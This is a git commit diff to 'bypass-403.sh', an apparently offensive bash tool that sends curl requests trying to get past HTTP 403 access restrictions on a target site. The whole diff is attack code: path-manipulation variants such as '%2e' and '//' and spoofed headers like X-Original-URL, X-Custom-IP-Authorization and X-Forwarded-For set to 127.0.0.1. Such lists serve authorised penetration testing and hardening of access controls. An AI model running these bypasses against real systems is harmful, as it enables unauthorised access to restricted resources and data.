9fc4ee5a362a326728868442ad94474ed4cf1770
iamj0ker <68040669+iamj0ker@users.noreply.github.com>
2020-11-30 06:51:34 +0530

    Added more bypasses

--- bypass-403.sh
+++ bypass-403.sh
@@ -1,19 +1,25 @@
 #! /bin/bash
 figlet Bypass-403
-echo "                                               By IamJ0ker"
+echo "                                               By Iam_J0ker"
 echo "./bypass-403.sh https://example.com path"
 sleep 2
-curl -s -o /dev/null -iL -w "%{http_code}" $1/$2
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
 echo "  --> ${1}/${2}"
-curl -s -o /dev/null -iL -w "%{http_code}" $1/%2e/$2
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
 echo "  --> ${1}/%2e/${2}"
-curl -s -o /dev/null -iL -w "%{http_code}" $1/$2/.
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
 echo "  --> ${1}/${2}/."
-curl -s -o /dev/null -iL -w "%{http_code}" $1//$2//
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
 echo "  --> ${1}//${2}//"
-curl -s -o /dev/null -iL -w "%{http_code}" $1/./$2/./
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
 echo "  --> ${1}/./${2}/./"
-curl -s -o /dev/null -iL -w "%{http_code}" -H "X-Original-URL: /$2" $1/$2
-echo "  --> ${1}/${2} -H X-Original-URL: /${2}"
-curl -s -o /dev/null -iL -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
+echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
 echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
+echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
+echo "  --> ${1} -H X-rewrite-url: ${2}"
